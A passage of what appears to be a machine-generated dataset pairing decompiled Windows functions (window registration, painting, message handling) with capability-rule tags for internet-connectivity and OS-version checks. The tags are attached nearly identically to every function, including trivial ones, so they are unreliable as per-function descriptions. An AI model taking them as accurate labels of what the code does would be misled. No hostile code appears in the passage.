            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044073c(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (((*(in_EAX + 0x6a) != '\\0') && (*(in_EAX + 0x1a7) != '\\0')) && (in_EAX[0x5f] != 0)) {\n        (**(*in_EAX[0x5f] + 0x2c))();\n    }\n    uStack32 = 0x440786;\n    cVar1 = fcn.004406e8(&stack0xfffffffc);\n    if (cVar1 != '\\0') {\n        (**(*in_EAX + 0x8c))();\n        fcn.004037f0();\n        uStack32 = 0x44081b;\n        uStack36 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffdc;\n        fcn.00440578(&stack0xfffffffc);\n        fcn.00440578(&stack0xfffffffc);\n        fcn.00440578(&stack0xfffffffc);\n        fcn.00440578(&stack0xfffffffc);\n        fcn.00440578(&stack0xfffffffc);\n        fcn.00440578(&stack0xfffffffc);\n        fcn.00440578(&stack0xfffffffc);\n        fcn.00403a28();\n        *in_FS_OFFSET = uStack36;\n        uStack32 = 0x44081a;\n        fcn.00403820();\n        return;\n    }\n    if (*(in_EAX + 0x1a6) != '\\0') {\n        fcn.00403a28();\n    }\n    return;\n}\n",
        "token_count": 412
    },
    "00440840": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00440840(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_14h;\n    uint var_4h;\n    \n    puStack32 = 0x440854;\n    cVar1 = fcn.00444380();\n    if ((cVar1 != '\\0') && ((*(in_EAX + 7) & 8) == 0)) {\n        if (*(in_EAX + 0x58) == 0) {\n            puStack32 = 0x440880;\n            fcn.004408d4();\n            uStack36 = 0x4408c7;\n            uStack40 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffd8;\n            puStack32 = &stack0xfffffffc;\n            (**(*in_EAX + 0x44))();\n            (**(*in_EAX + 0x90))();\n            *in_FS_OFFSET = uStack40;\n            puStack32 = 0x4408ce;\n            *(in_EAX + 0x15) = *(in_EAX + 0x15) & 0xffef;\n            uStack36 = 0x4408c6;\n            fcn.004408dc();\n            return;\n        }\n        *(in_EAX + 0x15) = *(in_EAX + 0x15) | 0x10;\n    }\n    return;\n}\n",
        "token_count": 339
    },
    "004408dc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004408dc(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0x160) = *(in_EAX + 0x160) + -1;\n    if ((*(in_EAX + 0x160) == 0) && ((*(in_EAX + 0x54) & 0x10) != 0)) {\n        fcn.004408fc();\n    }\n    return;\n}\n",
        "token_count": 100
    },
    "00440d94": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00440d94(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.00440d74();\n    if (-1 < iVar1 + -1) {\n        do {\n            iVar2 = fcn.00440d38();\n            (**(iVar2 + 0x38))();\n            if (*(param_2 + 0xc) != 0) {\n                return;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 137
    },
    "00440e68": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00440e68(uint param_1, uint32_t *param_2)\n\n{\n    char cVar1;\n    \n    cVar1 = fcn.0043de80();\n    if (cVar1 != '\\0') {\n        *param_2 = *param_2 | 0x2000;\n    }\n    cVar1 = fcn.0043deb0();\n    if (cVar1 != '\\0') {\n        *param_2 = *param_2 | 0x4000;\n    }\n    cVar1 = fcn.00403a28();\n    if (cVar1 != '\\0') {\n        cVar1 = fcn.00403a28();\n        if (cVar1 == '\\0') {\n            *param_2 = *param_2 | 0x1000;\n        }\n        else {\n            cVar1 = fcn.00403a28();\n            if (cVar1 == '\\x01') {\n                *param_2 = *param_2;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 234
    },
    "00440ffc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00440ffc(void)\n\n{\n    char cVar1;\n    int16_t iVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *in_FS_OFFSET;\n    uint uVar5;\n    uint *arg_ch;\n    uint uStack216;\n    uint uStack212;\n    uchar *puStack208;\n    uint var_c0h;\n    int32_t var_bch;\n    uint var_b8h;\n    uint lpWndClass;\n    code *var_b0h;\n    uint var_8ch;\n    uint var_85h;\n    int32_t var_70h;\n    uint var_68h;\n    code *var_64h;\n    uint hInstance;\n    uint *var_44h;\n    uint lpClassName;\n    \n    puStack208 = &stack0xfffffffc;\n    uStack212 = 0x4411bd;\n    uStack216 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack216;\n    (**(*in_EAX + 0x98))();\n    if ((var_70h == 0) && ((var_85h & 0x40) != 0)) {\n        if ((in_EAX[1] != 0) && ((*(in_EAX[1] + 0x1c) & 2) != 0)) {\n            cVar1 = fcn.004039b8();\n            if (cVar1 != '\\0') {\n                var_70h = fcn.0044407c();\n                goto code_r0x004410a8;\n            }\n        }\n        var_bch = in_EAX[2];\n        var_b8h._0_1_ = 0xb;\n        arg_ch = &var_bch;\n        uVar5 = 0;\n        fcn.0040675c();\n        fcn.0040c918(uVar5, arg_ch);\n        fcn.00403fc0();\n    }\ncode_r0x004410a8:\n    in_EAX[0x5d] = var_64h;\n    iVar3 = sub.user32.dll_GetClassInfoA(hInstance, &lpClassName, &lpWndClass);\n    if ((iVar3 == 0) || (var_b0h != fcn.0043a620)) {\n        if (iVar3 != 0) {\n            sub.user32.dll_UnregisterClassA(&lpClassName, hInstance);\n        }\n        var_64h = fcn.0043a620;\n        var_44h = &lpClassName;\n        iVar2 = sub.user32.dll_RegisterClassA(&var_68h);\n        if (iVar2 == 0) {\n            fcn.0040ded0();\n        }\n    }\n    *0x483bc4 = in_EAX;\n    (**(*in_EAX + 0x9c))();\n    if (in_EAX[0x60] == 0) {\n        fcn.0040ded0();\n    }\n    uVar4 = sub.user32.dll_GetWindowLongA(in_EAX[0x60], 0xfffffff0);\n    if ((uVar4 & 0x40000000) != 0) {\n        iVar3 = sub.user32.dll_GetWindowLongA(in_EAX[0x60], 0xfffffff4);\n        if (iVar3 == 0) {\n            sub.user32.dll_SetWindowLongA(in_EAX[0x60], 0xfffffff4, in_EAX[0x60]);\n        }\n    }\n    fcn.004094f0();\n    in_EAX[0x19] = 0;\n    fcn.0044438c();\n    uVar5 = 1;\n    fcn.0042614c();\n    fcn.0043e9fc(uVar5);\n    if (*(in_EAX + 0x17) != '\\0') {\n        fcn.00403a28();\n    }\n    *in_FS_OFFSET = uVar5;\n    fcn.004045c8(0x4411c4);\n    return;\n}\n",
        "token_count": 898
    },
    "004412ac": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint32_t __cdecl fcn.004412ac(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uchar auStack8 [3];\n    uint var_1h;\n    \n    _auStack8 = 0x1000000;\n    if ((*(*(arg_8h + -4) + 0x20) == 0) || (uVar1 = fcn.00441298(),  uVar1 == '\\0')) {\n        iVar3 = *(*(arg_8h + -8) + 0x198);\n        if ((iVar3 != 0) && (iVar3 = *(iVar3 + 8),  -1 < iVar3 + -1)) {\n            do {\n                uVar2 = fcn.0041c4c8();\n                if ((*(uVar2 + 0x5b) == '\\0') && (uVar1 = uVar2 & 0xffffff00,  *0x441380 != *(uVar2 + 0x61)))\n                goto code_r0x00441377;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n        uVar1 = *(*(arg_8h + -8) + 0x19c);\n        if ((uVar1 != 0) && (iVar3 = *(uVar1 + 8),  -1 < iVar3 + -1)) {\n            do {\n                uVar2 = fcn.0041c4c8();\n                uVar1 = uVar2;\n                if ((*(uVar2 + 0x5b) == '\\0') && (uVar1 = uVar2 & 0xffffff00,  *0x441380 != *(uVar2 + 0x61)))\n                goto code_r0x00441377;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n    }\n    _auStack8 = 0;\ncode_r0x00441377:\n    return uVar1 & 0xffffff00 | _auStack8 >> 0x18;\n}\n",
        "token_count": 491
    },
    "004413e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004413e0(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = fcn.0043d7bc();\n    if (iVar1 < 1) {\n        iVar1 = fcn.004094bc();\n        in_EAX[0x19] = iVar1;\n    }\n    else {\n        iVar1 = fcn.00409494();\n        in_EAX[0x19] = iVar1;\n        fcn.004094a8();\n        fcn.0043d7cc();\n    }\n    fcn.0043c270();\n    (**(*in_EAX + 0xac))();\n    return;\n}\n",
        "token_count": 151
    },
    "0044159c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044159c(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if (in_EAX[0x60] != 0) {\n        if ((in_EAX[0x67] != 0) && (iVar1 = *(in_EAX[0x67] + 8),  -1 < iVar1 + -1)) {\n            do {\n                fcn.0041c4c8();\n                fcn.0044159c();\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != 0);\n        }\n        (**(*in_EAX + 0xb0))();\n    }\n    return;\n}\n",
        "token_count": 153
    },
    "004415e4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004415e4(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x180) != 0) {\n        fcn.0043e9fc(0);\n    }\n    return;\n}\n",
        "token_count": 56
    },
    "0044163c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044163c(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_4h;\n    \n    if (((*(in_EAX + 0x57) == '\\0') && (((*(in_EAX + 7) & 0x10) == 0 || ((*(in_EAX + 0x51) & 4) != 0)))) ||\n       ((*(in_EAX + 0x15) & 8) != 0)) {\n        cVar1 = '\\0';\n    }\n    else {\n        cVar1 = '\\x01';\n    }\n    if (cVar1 != '\\0') {\n        if (in_EAX[0x60] == 0) {\n            puStack28 = 0x441692;\n            (**(*in_EAX + 0x94))();\n        }\n        if ((in_EAX[0x67] != 0) && (iVar2 = *(in_EAX[0x67] + 8),  -1 < iVar2 + -1)) {\n            do {\n                puStack28 = 0x4416ba;\n                fcn.0041c4c8();\n                puStack28 = 0x4416bf;\n                fcn.0044163c();\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n    }\n    if ((in_EAX[0x60] != 0) && (*(in_EAX + 0x1a6) != cVar1)) {\n        *(in_EAX + 0x1a6) = cVar1;\n        uStack32 = 0x441712;\n        uStack36 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffdc;\n        uVar3 = 0;\n        puStack28 = &stack0xfffffffc;\n        fcn.0043e9fc(0);\n        *in_FS_OFFSET = uVar3;\n    }\n    return;\n}\n",
        "token_count": 476
    },
    "00441738": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00441738(void)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t in_EAX;\n    \n    while (iVar1 = *(in_EAX + 0x30),  iVar1 != 0) {\n        in_EAX = iVar1;\n        if (*(iVar1 + 0x1a6) == '\\0') {\n            return;\n        }\n    }\n    cVar2 = fcn.004039b8();\n    if ((cVar2 == '\\0') && (*(in_EAX + 400) == 0)) {\n        return;\n    }\n    fcn.0044163c();\n    return;\n}\n",
        "token_count": 145
    },
    "00441778": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00441778(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint arg_8h;\n    \n    if ((*(in_EAX + 0x30) == 0) && (param_2 != *(in_EAX + 400))) {\n        if ((*(in_EAX + 0x180) == 0) || ((*(in_EAX + 400) == 0 || (param_2 == 0)))) {\n            fcn.0044159c();\n            *(in_EAX + 400) = param_2;\n        }\n        else {\n            *(in_EAX + 400) = param_2;\n            sub.user32.dll_SetParent(*(in_EAX + 0x180), param_2);\n            if ((4 < **0x484460) && (**0x48484c == 2)) {\n                arg_8h = 0;\n                fcn.00407624();\n                fcn.0043e9fc(arg_8h);\n            }\n        }\n        fcn.00441738();\n    }\n    return;\n}\n",
        "token_count": 246
    },
    "00441878": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00441878(int32_t arg_8h)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    uint arg_8h_00;\n    uint lprc;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.0041b058();\n    *(arg_8h + -0xc) = var_8h;\n    *(arg_8h + -8) = var_4h;\n    (**(*in_EAX + 0x44))(*(arg_8h + -0xc), *(arg_8h + -8));\n    iVar3 = sub.user32.dll_PtInRect(&lprc);\n    if (iVar3 != 0) {\n        if (((*(in_EAX + 7) & 0x10) != 0) && ((*(in_EAX + 0x57) != '\\0' || ((*(in_EAX + 0x51) & 4) == 0)))) {\ncode_r0x0044191d:\n            bVar1 = true;\n            goto code_r0x0044191f;\n        }\n        if (*(in_EAX + 0x57) != '\\0') {\n            cVar2 = (**(*in_EAX + 0x50))();\n            if ((cVar2 != '\\0') || (*(arg_8h + -0xd) != '\\0')) {\n                arg_8h_00 = fcn.0040760c();\n                iVar3 = fcn.0043e9fc(arg_8h_00);\n                if (iVar3 != 0) goto code_r0x0044191d;\n            }\n        }\n    }\n    bVar1 = false;\ncode_r0x0044191f:\n    if (bVar1) {\n        *(arg_8h + -0x14) = in_EAX;\n    }\n    return;\n}\n",
        "token_count": 431
    },
    "00441930": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00441930(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uchar *puVar3;\n    uint var_14h;\n    uint var_dh;\n    uint var_4h;\n    \n    if (((arg_8h != '\\0') && (*(in_EAX + 0x19c) != 0)) && (iVar2 = *(*(in_EAX + 0x19c) + 8) + -1,  -1 < iVar2)) {\n        do {\n            puVar3 = &stack0xfffffffc;\n            fcn.0041c4c8();\n            cVar1 = fcn.00441878(puVar3);\n            if (cVar1 != '\\0') break;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    if ((*(in_EAX + 0x198) != 0) && (iVar2 = *(*(in_EAX + 0x198) + 8) + -1,  -1 < iVar2)) {\n        do {\n            puVar3 = &stack0xfffffffc;\n            fcn.0041c4c8();\n            cVar1 = fcn.00441878(puVar3);\n            if (cVar1 != '\\0') {\n                return 0;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    return 0;\n}\n",
        "token_count": 337
    },
    "004419c4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __fastcall fcn.004419c4(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar1 = fcn.0044407c();\n    iVar2 = sub.user32.dll_GetCapture();\n    if (iVar1 == iVar2) {\n        if ((*0x483c84 == 0) || (iVar1 = *0x483c84,  in_EAX != *(*0x483c84 + 0x30))) {\n            iVar1 = 0;\n        }\n    }\n    else {\n        uVar3 = 0;\n        fcn.004075f8();\n        iVar1 = fcn.00441930(uVar3);\n    }\n    if (iVar1 != 0) {\n        uVar3 = fcn.0040760c(*(param_2 + 8) - *(iVar1 + 0x40), *(param_2 + 10) - *(iVar1 + 0x44));\n        uVar3 = fcn.0043e9fc(uVar3);\n        *(param_2 + 0xc) = uVar3;\n    }\n    return iVar1 != 0;\n}\n",
        "token_count": 276
    },
    "00441a58": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00441a58(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t in_EAX;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uVar6;\n    \n    iVar4 = *param_2;\n    if (iVar4 < 0x85) {\n        if (iVar4 == 0x84) {\n            fcn.0043eac8();\n            if (param_2[3] != -1) {\n                return;\n            }\n            uVar6 = 0;\n            fcn.004075f8();\n            fcn.0043d38c();\n            iVar4 = fcn.00441930(uVar6);\n            if (iVar4 == 0) {\n                return;\n            }\n            param_2[3] = 1;\n            return;\n        }\n        if (iVar4 == 7) {\n            piVar3 = fcn.004544bc();\n            if ((piVar3 != NULL) && (cVar1 = (**(*piVar3 + 0xe8))(),  cVar1 == '\\0')) {\n                return;\n            }\n            goto code_r0x00441bab;\n        }\n        if (iVar4 != 8) {\n            if (iVar4 == 0x1f) {\n                iVar4 = fcn.0044407c();\n                iVar5 = sub.user32.dll_GetCapture();\n                if (((iVar4 == iVar5) && (*0x483c84 != 0)) && (in_EAX == *(*0x483c84 + 0x30))) {\n                    fcn.0043e9fc(0);\n                }\n            }\n            goto code_r0x00441bab;\n        }\n        uVar2 = *(in_EAX + 0x54) & 0x20;\n    }\n    else {\n        if (8 < iVar4 - 0x100U) {\n            if ((iVar4 - 0x200U < 0xb) && (cVar1 = fcn.004419c4(),  cVar1 != '\\0')) {\n                if (param_2[3] != 0) {\n                    return;\n                }\n                cVar1 = fcn.00444380();\n                if (cVar1 == '\\0') {\n                    return;\n                }\n                uVar6 = fcn.0044407c(*param_2, param_2[1], param_2[2]);\n                sub.user32.dll_DefWindowProcA(uVar6);\n                return;\n            }\n            goto code_r0x00441bab;\n        }\n        uVar2 = fcn.0043dfac();\n    }\n    if (uVar2 != 0) {\n        return;\n    }\ncode_r0x00441bab:\n    fcn.0043eac8();\n    return;\n}\n",
        "token_count": 638
    },
    "00441bbc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00441bbc(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (*(in_EAX + 0x180) == 0) {\n        fcn.0043ec5c();\n    }\n    else {\n        if ((*param_2 == 0x7b) && (*(in_EAX + 0x30) != 0)) {\n            iVar1 = fcn.0043e9fc(param_2[2]);\n            param_2[3] = iVar1;\n            if (iVar1 != 0) {\n                return;\n            }\n        }\n        iVar1 = *param_2;\n        if (iVar1 - 0x132U < 7) {\n            iVar1 = sub.user32.dll_SendMessageA(param_2[2], iVar1 + 0xbc00, param_2[1], param_2[2]);\n            param_2[3] = iVar1;\n        }\n        else if (iVar1 - 0xbd32U < 7) {\n            uVar2 = fcn.00425c78();\n            sub.gdi32.dll_SetTextColor(param_2[1], uVar2);\n            fcn.004268fc();\n            uVar2 = fcn.00425c78();\n            sub.gdi32.dll_SetBkColor(param_2[1], uVar2);\n            iVar1 = fcn.00426938();\n            param_2[3] = iVar1;\n        }\n        else if (iVar1 == *0x485ac0) {\n            param_2[3] = in_EAX;\n        }\n        else {\n            iVar1 = sub.user32.dll_CallWindowProcA(*(in_EAX + 0x174), *(in_EAX + 0x180), iVar1, param_2[1], param_2[2]);\n            param_2[3] = iVar1;\n        }\n        if (*param_2 == 0xc) {\n            fcn.0043d3e8(param_2[2]);\n        }\n    }\n    return;\n}\n",
        "token_count": 469
    },
    "00441cf8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00441cf8(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffff80;\n    int32_t iVar5;\n    int32_t iStack116;\n    uint uStack112;\n    uchar *puStack108;\n    uint uStack104;\n    uint *puStack100;\n    uint var_50h;\n    uint nSavedDC;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    iVar1 = *(param_2 + 4);\n    var_8h = param_2;\n    var_4h = in_EAX;\n    if (iVar1 == 0) {\n        puStack100 = &fcn.00441cf8::var_50h;\n        uStack104 = 0x441d1d;\n        uStack104 = fcn.0044407c();\n        puStack108 = 0x441d23;\n        iVar1 = sub.user32.dll_BeginPaint();\n    }\n    uStack112 = 0x441e18;\n    iStack116 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff8c;\n    if (var_4h[0x66] == 0) {\n        puStack108 = &stack0xfffffffc;\n        (**(*var_4h + 0xb8))();\n        iVar1 = in_stack_ffffff80;\n    }\n    else {\n        iVar5 = iVar1;\n        puStack108 = &stack0xfffffffc;\n        nSavedDC = sub.gdi32.dll_SaveDC(iVar1);\n        var_ch = 2;\n        iVar4 = *(var_4h[0x66] + 8);\n        if (-1 < iVar4 + -1) {\n            do {\n                iVar2 = fcn.0041c4c8();\n                if ((((*(iVar2 + 0x57) != '\\0') || (((*(iVar2 + 0x1c) & 0x10) != 0 && ((*(iVar2 + 0x51) & 4) == 0)))) &&\n                    ((*(iVar2 + 0x50) & 0x40) != 0)) &&\n                   (iVar5 = iVar1,  var_ch = sub.gdi32.dll_ExcludeClipRect(),  var_ch == 1)) break;\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n        }\n        if (var_ch != 1) {\n            (**(*var_4h + 0xb8))(iVar5);\n        }\n        sub.gdi32.dll_RestoreDC(iVar1, nSavedDC);\n    }\n    fcn.00441e50();\n    *in_FS_OFFSET = iVar1;\n    if (*(var_8h + 4) == 0) {\n        uVar3 = fcn.0044407c(&fcn.00441cf8::var_50h, 0x441e1f);\n        sub.user32.dll_EndPaint(uVar3);\n    }\n    return;\n}\n",
        "token_count": 715
    },
    "00441e50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00441e50(int32_t param_1, uchar *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    uchar *puStack72;\n    uchar *puStack68;\n    uchar *puStack48;\n    uint uStack44;\n    int32_t iStack36;\n    uchar auStack32 [16];\n    \n    if (((*(in_EAX + 0x1a8) != '\\0') && (*(in_EAX + 0x1a7) != '\\0')) && (*(in_EAX + 0x17c) != 0)) {\n        (**(**(in_EAX + 0x17c) + 0x20))();\n    }\n    if (*(in_EAX + 0x198) != 0) {\n        iVar4 = 0;\n        if ((param_1 != 0) && (iVar4 = fcn.0041c52c(),  iVar4 < 0)) {\n            iVar4 = 0;\n        }\n        puStack48 = *(*(in_EAX + 0x198) + 8);\n        if (iVar4 < puStack48) {\n            do {\n                iVar1 = fcn.0041c4c8();\n                if ((*(iVar1 + 0x57) != '\\0') || (((*(iVar1 + 0x1c) & 0x10) != 0 && ((*(iVar1 + 0x51) & 4) == 0)))) {\n                    fcn.0041b080(&stack0xffffffe0, *(iVar1 + 0x44) + *(iVar1 + 0x4c));\n                    puStack68 = 0x441f0e;\n                    iVar2 = sub.gdi32.dll_RectVisible();\n                    puStack48 = param_2;\n                    if (iVar2 != 0) {\n                        if ((*(in_EAX + 0x54) & 0x80) != 0) {\n                            *(iVar1 + 0x54) = *(iVar1 + 0x54) | 0x80;\n                        }\n                        puStack72 = 0x441f24;\n                        puStack68 = param_2;\n                        sub.gdi32.dll_SaveDC();\n                        puStack72 = 0x441f35;\n                        fcn.0043c184();\n                        puStack72 = *(iVar1 + 0x4c);\n                        sub.gdi32.dll_IntersectClipRect(param_2, 0, 0, *(iVar1 + 0x48));\n                        fcn.0043e9fc(0);\n                        sub.gdi32.dll_RestoreDC();\n                        *(iVar1 + 0x54) = *(iVar1 + 0x54) & 0xff7f;\n                    }\n                }\n                iVar4 = iVar4 + 1;\n            } while (iVar4 < puStack48);\n        }\n    }\n    if ((*(in_EAX + 0x19c) != 0) && (iStack36 = *(*(in_EAX + 0x19c) + 8),  -1 < iStack36 + -1)) {\n        do {\n            iVar4 = fcn.0041c4c8();\n            if (((*(iVar4 + 0x1a5) != '\\0') && ((*(iVar4 + 0x50) & 0x10) != 0)) &&\n               ((*(iVar4 + 0x57) != '\\0' || (((*(iVar4 + 0x1c) & 0x10) != 0 && ((*(iVar4 + 0x51) & 4) == 0)))))) {\n                fcn.00425c78();\n                uStack44 = sub.gdi32.dll_CreateSolidBrush();\n                puVar5 = &stack0xffffffdc;\n                puStack68 = 0x44200b;\n                fcn.0041b080(puVar5, *(iVar4 + 0x44) + *(iVar4 + 0x4c));\n           